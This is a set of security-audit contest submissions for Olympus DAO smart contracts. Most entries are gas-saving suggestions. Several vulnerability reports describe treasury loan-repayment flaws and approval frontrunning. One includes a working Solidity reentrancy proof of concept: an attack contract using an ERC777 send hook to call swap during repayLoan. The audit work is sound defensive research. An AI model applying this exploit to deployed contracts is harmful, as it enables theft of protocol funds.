[Operator.sol#455](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L455)  ## [G10] Using bools for storage incurs overhead ### Description Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past  ### Lines in the code [Kernel.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L113) [Kernel.sol#L181](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L181) [Kernel.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L194) [Kernel.sol#L197](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L197) [RANGE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L44) [PRICE.sol#L62](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L62) [Operator.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L63) [Operator.sol#L66](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L66) [Operator.sol#L735](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L735) [BondCallback.sol#L24](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L24) [Heart.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L33) [Governance.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L105) [Governance.sol#L117](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L117) [IOperator.sol#L34](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L34)  ## [G11] Multiplication/division by two should use bit shifting ### Description <x> * 2 is equivalent to <x> << 1 and <x> / 2 is the same as <x> >> 1.  The MUL and DIV opcodes cost 5 gas, whereas SHL and SHR only cost 3 gas  ### Proof of concept ```solidity contract TestDiv2 {  function TestDivBy2 () public returns (uint256){   uint256 i = 4;   i = i / 2;   return i;  } }  contract TestDivShift {  function TestDivByShift () public returns (uint256){   uint256 i = 4;   i = i >> 1;   return i;  } } ``` - Transaction cost of TestDiv2 is 21581 gas - Transaction cost of TestDivShift is 21409 gas  - After the test it's possible to **save 172 gas with this optimization** per ocurrence.  ### Lines in the code [Operator.sol#L372](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372) [Operator.sol#L419](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L419) [Operator.sol#L420](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L420) [Operator.sol#L427](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427)  ## [G12] Calldata vs Memory ### Description Use calldata instead of memory in a function parameter when you are only to read the data can save gas by storing it in calldata  ### Lines in the code [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L205) [TreasuryCustodian.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L53) [BondCallback.sol#L152](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L152) [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L45)   ## [G13] Use a more recent version of solidity ### Description Use a solidity version of at least 0.8.16 to have more efficient code for checked addition and subtraction.   ### Lines in the code [Kernel.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L2) [KernelUtils.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L2) [TRSRY.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L2) [MINTR.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/MINTR.sol#L2) [RANGE.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L2) [PRICE.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L2) [VOTES.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L2) [INSTR.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/INSTR.sol#L2) [TreasuryCustodian.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L2) [Operator.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L2) [BondCallback.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L2) [Heart.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L2) [PriceConfig.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L2) [Governance.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L2) [VoterRegistration.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/VoterRegistration.sol#L2) [IBondCallback.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/interfaces/IBondCallback.sol#L2) [IHeart.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IHeart.sol#L2) [IOperator.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L2)  ## [G14] Using storage instead of memory for structs/arrays ### Description When retrieving data from a memory location, assigning the data to a memory variable causes all fields of the struct/array to be read from memory,  resulting in a Gcoldsload (2100 gas) for each field of the struct/array. When reading fields from new memory variables, they cause an extra MLOAD  instead of a cheap stack read. Rather than declaring a variable with the memory keyword, it is much cheaper to declare a variable with the storage  keyword and cache all fields that need to be read again in a stack variable, because the fields actually read will only result in a Gcoldsload.  The only case where the entire struct/array is read into a memory variable is when the entire struct/array is returned by a function,  passed to a function that needs memory, or when the array/struct is read from another store array/struct.  ### Lines in the code [Kernel.sol#L379](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L379) [Kernel.sol#L398](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L398) [RANGE.sol#L80](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L80) [Operator.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L96) [Operator.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L97) [BondCallback.sol#L179](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L179) [Governance.sol#L206](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L206)  ## [G15] Tight variable packing  ### Description Reordering the variables's declaration it's possible to save some slots. Apply the following changes.  #### Operator.sol ```diff     /// Operator variables, defined in the interface on the external getter functions     Status internal _status;     Config internal _config;      /// @notice    Whether the Operator has been initialized -   bool public initialized;      /// @notice    Whether the Operator is active -   bool public active;      /// Modules     OlympusPrice internal PRICE;     OlympusRange internal RANGE;     OlympusTreasury internal TRSRY;     OlympusMinter internal MINTR;      /// External contracts     /// @notice     Auctioneer contract used for cushion bond market deployments     IBondAuctioneer public auctioneer;     /// @notice     Callback contract used for cushion bond market payouts     IBondCallback public callback;      /// Tokens     /// @notice     OHM token contract     ERC20 public immutable ohm; -   uint8 public immutable ohmDecimals;     /// @notice     Reserve token contract     ERC20 public immutable reserve;     uint8 public immutable reserveDecimals; +   uint8 public immutable ohmDecimals; +   bool public initialized; +   bool public active;     /// Constants     uint32 public constant FACTOR_SCALE = 1e4; ``` ### Lines in the code [Operator.sol#L59-L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L59-L89)  ## [G16] Move variable declaration before is going to be used ### Description It's important to declare the variable before it's use and after to the if/require conditions becase of it's possible to save gas when the if's/require conditions are true and the execution doesn't follow.  ```diff function endorseProposal(uint256 proposalId_) external { -   uint256 userVotes = VOTES.balanceOf(msg.sender);      if (proposalId_ == 0) {         revert CannotEndorseNullProposal();     }      Instruction[] memory instructions = INSTR.getInstructions(proposalId_);     if (instructions.length == 0) {         revert CannotEndorseInvalidProposal();     }      // undo any previous endorsement the user made on these instructions     uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];     totalEndorsementsForProposal[proposalId_] -= previousEndorsement;      // reapply user endorsements with most up-to-date votes +   uint256 userVotes = VOTES.balanceOf(msg.sender);     userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;     totalEndorsementsForProposal[proposalId_] += userVotes;      emit ProposalEndorsed(proposalId_, msg.sender, userVotes); } ```  ```diff function vote(bool for_) external { -   uint256 userVotes = VOTES.balanceOf(msg.sender);      if (activeProposal.proposalId == 0) {         revert NoActiveProposalDetected();     }      if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {         revert UserAlreadyVoted();     }   +   uint256 userVotes = VOTES.balanceOf(msg.sender);     if (for_) {         yesVotesForProposal[activeProposal.proposalId] += userVotes;     } else {         noVotesForProposal[activeProposal.proposalId] += userVotes;     }      userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;      VOTES.transferFrom(msg.sender, address(this), userVotes);      emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes); } ``` ### Lines in the code [Governance.sol#L180-L201](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L180-L201) [Governance.sol#L240-L262](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L240-L262)  ## [G17] Refactoring code ### Description In the following case it's possible to save gas checking the common condition once instead of twice.   ```diff -if ( -    uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) && -    _status.high.count >= config_.regenThreshold -) { -    _regenerate(true); -} -if ( -    uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) && -    _status.low.count >= config_.regenThreshold -) { -    _regenerate(false); -}  +if (uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait)) +{ + if (_status.high.count >= config_.regenThreshold) + { +  _regenerate(true); + } + if (_status.low.count >= config_.regenThreshold)  + { +  _regenerate(false); + } +}  ```  ### Lines in the code [Operator.sol#L209-L220](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L209-L220)  ## [G18] Use unchecked when it's not possible to overflow ### Description The default “checked” behavior costs more gas when adding/diving/multiplying, because under-the-hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected. if it can statically be determined there is no possible way for your arithmetic to under/overflow (such as a condition in an if statement), surrounding the arithmetic in an unchecked block will save gas.  For all for-loops in the code it is possible to change as the following example.  ```diff for (uint256 i;i < X;){  -- code --  unchecked  {   ++i;  } } ```  ### Proof of concept  ```solidity contract TestWithoutUnchecked {  function Test() public {   for(uint256 i; i < 10; ){    ++i;   }  } }  contract TestWitUnchecked {  function Test() public {   for(uint256 i; i < 10; ){    unchecked {     ++i;    }   }  } }  ```  - Transaction cost of TestWithoutUnchecked is 22958 gas - Transaction cost of TestWitUnchecked is 21728 gas  - After the test it's possible to save 1230 gas in this loop so this mean **123 gas per loop is saved with this optimization**.  ### Lines in the code [Operator.sol#L487-L488](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L487-L488)   ## [G19] Internal functions only called once can be inlined to save gas  ### Description Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  ### Operator._addObservation [Operator.sol#L652](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L652) ### Kernel._installModule [Kernel.sol#L266-L277](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L266-L277) ### Kernel._upgradeModule [Kernel.sol#L279-L293](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L279-L293) ### Kernel._activatePolicy [Kernel.sol#L295-L323](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L295-L323) ### Kernel._deactivatePolicy [Kernel.sol#L325-L346](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L325-L346) ### Kernel._migrateKernel [Kernel.sol#L351-L372](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L351-L372) ### Kernel._reconfigurePolicies [Kernel.sol#L378-L389](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L378-L389) ### Kernel._pruneFromDependents [Kernel.sol#L409-L432](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L409-L432)  ## [G20] Remove unused functions  ### Description Remove the following functions in Kernel.sol (getModuleAddress) to save gas due to it's internal and it's not used inside the contract.   ### Lines in the code [Kernel.sol#L131-L135](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L131-L135)  
1. Use External than Public for saving more gas  Files :   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L34  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L37  2. Use Unchecked i++ for saving more gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L48-L49  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L63-L64  3. Saving gas by removing ` = 0`  This implementation code can be saving more gas by removing = 0, it because If a variable was not set/initialized, it is assumed to have default value to 0  Files :  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L253-L255 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L285-L287  4. Set value as immutable   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28-L31  5.  change `uint256 i = 0` into `uint256 i` for saving more gas  using this implementation can saving more gas for each loops.  Files :   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112   # Vulnerability details  ## Impact An attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.  ## Proof of Concept The code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.  The problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.  ## Recommended Mitigation Steps Add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.
[NC - 01] - Typo https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L126  Line 126 `Price.sol` numbe -> number  [NC - 02] - Left TODO https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L657  `Operator.sol` line 657 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60   # Vulnerability details  ## Impact low market bonds/swaps not working after loan is taken from TRSRY  I am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, is hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.  ## Proof of Concept this will cause test to fail on TRANSFER_FAILED due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.  ```diff diff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol index e09aec1..5c1e95f 100644 --- a/src/test/policies/Operator.t.sol +++ b/src/test/policies/Operator.t.sol @@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from "modules/MINTR.sol";  import {Operator} from "policies/Operator.sol";  import {BondCallback} from "policies/BondCallback.sol";   +import {ModuleTestFixtureGenerator} from "test/lib/ModuleTestFixtureGenerator.sol"; +  contract MockOhm is ERC20 {      constructor(          string memory _name, @@ -45,6 +47,7 @@ contract MockOhm is ERC20 {  // solhint-disable-next-line max-states-count  contract OperatorTest is Test {      using FullMath for uint256; +    using ModuleTestFixtureGenerator for OlympusTreasury;        UserFactory public userCreator;      address internal alice; @@ -53,6 +56,9 @@ contract OperatorTest is Test {      address internal policy;      address internal heart;   +    address public debtor; +    address public godmode;  +      RolesAuthority internal auth;      BondAggregator internal aggregator;      BondFixedTermTeller internal teller; @@ -187,6 +193,18 @@ contract OperatorTest is Test {            reserve.mint(address(treasury), testReserve * 100);   +        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector); +        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name); +         +        kernel.executeAction(Actions.ActivatePolicy, godmode); +        kernel.executeAction(Actions.ActivatePolicy, debtor); +         +        vm.prank(godmode); +        treasury.setApprovalFor(debtor, reserve, testReserve * 100); + +        vm.prank(debtor); +        treasury.getLoan(reserve,testReserve*100); +          // Approve the operator and bond teller for the tokens to swap          vm.prank(alice);          ohm.approve(address(operator), testOhm * 20); ```  same is applicable for low market bonds since they are created based on the same capacity  ## Tools Used vs code + tests  ## Recommended Mitigation Steps determine capacity from actual tokens held by treasury.
- `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (`-` too)     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138 - Using `private` rather than `public` for constants, saves gas     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59    - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65 - `++i` costs less gas than `++i`, especially when it is used in for-loop     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488    
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48   # Vulnerability details  ## Impact  An attacker may be able to withdraw more than intended  ## Proof of Concept  Let's say the alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.  ```solidity // modules/TRSRY.sol   63     /// @notice Sets approval for specific withdrawer addresses  64     function setApprovalFor(  65         address withdrawer_,  66         ERC20 token_,  67         uint256 amount_  68     ) external permissioned {  69         withdrawApproval[withdrawer_][token_] = amount_;  70  71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);  72     } ```  The `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval. ```solidity  41  42     function grantApproval(  43         address for_,  44         ERC20 token_,  45         uint256 amount_  46     ) external onlyRole("custodian") {  47         TRSRY.setApprovalFor(for_, token_, amount_);  48     } ```   ## Tools Used  none  ## Recommended Mitigation Steps  Instead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.  <!-- zzzitron M06 -->    
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330   # Vulnerability details  ## Impact  One can repay loan to the treasury with the value from the Operator::swap  Condition:   - the reserve token in Operator has hook for sender (like ERC777)   - the debt is the same token as reserve  ## Proof of Concept   The below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).  Let's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.  In the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.  ```solidity /// Mock to simulate the senders hook /// for simplicity omitted the certain aspects like ERC1820 registry and etc. contract MockERC777 is MockERC20 {     constructor () MockERC20("ERC777", "777", 18) {}      function transferFrom(address from, address to, uint256 amount) public override returns (bool) {         _callTokenToSend(from, to, amount);         return super.transferFrom(from, to, amount);         // _callTokenReceived(from, to, amount);     }      // simplified implementation for ERC777     function _callTokenToSend(address from, address to, uint256 amount) private {       if (from != address(0)) {         IERC777Sender(from).tokensToSend(from, to, amount);       }     } }  interface IERC777Sender {   function tokensToSend(address from, address to, uint256 amount) external; }  /// Concept for an attack contract contract Reenterer is IERC777Sender {   ERC20 public token;   Operator public operator;   bool public entered;    constructor(address token_, Operator op_) {     token = ERC20(token_);     operator = op_;   }    function tokensToSend(address from, address to, uint256 amount) external override {     if (!entered) {     // call swap from reenter     // which will manipulate the balance of treasury       entered = true;       operator.swap(token, 1e17, 0);     }   }      function attack(OlympusTreasury treasury) public {     // approve to the treasury     token.approve(address(treasury), 1e18);     token.approve(address(operator), 100* 1e18);      // repayDebt of 1e17     treasury.repayLoan(token, 1e17);   } } ```  ```solidity /// the test     function test_poc__reenter() public {         vm.prank(guardian);         operator.initialize();        reserve.mint(address(reenterer), 1e18);       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);       // start repayLoan       reenterer.attack(treasury);       // it should be 9 * 1e17 but it is 8 * 1e17       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);     } ```  ## Cause  The `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.  ```solidity // OlympusTreasury::repayLoan // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { 106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding(); 107 108         // Deposit from caller first (to handle nonstandard token transfers) 109         uint256 prevBalance = token_.balanceOf(address(this)); 110         token_.safeTransferFrom(msg.sender, address(this), amount_); 111 112         uint256 received = token_.balanceOf(address(this)) - prevBalance; ```  In the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.  ```solidity // Operator::swap // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330 329             /// Transfer reserves to treasury 330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_); ```  Although both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.  ## Tools Used  foundry  ## Recommended Mitigation Steps  The deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.   <!-- zzzitron M00 -->    
 ## <X> += <Y> COSTS MORE GAS THAN <x> = <X> + <Y> FOR STATE VARIABLES https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138   ## FOR LOOPS CAN BE MORE EFFICIENT  To optimize the for loop and make it consume less gas, i suggest to:  1. If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.   2. Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration. I suggest storing the array’s length in a variable before the for-loop.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58  ```for (uint256 i = 0; i < 32; ) {```  Actually this solution is already done in other contracts, so i suggest to change the line code above.
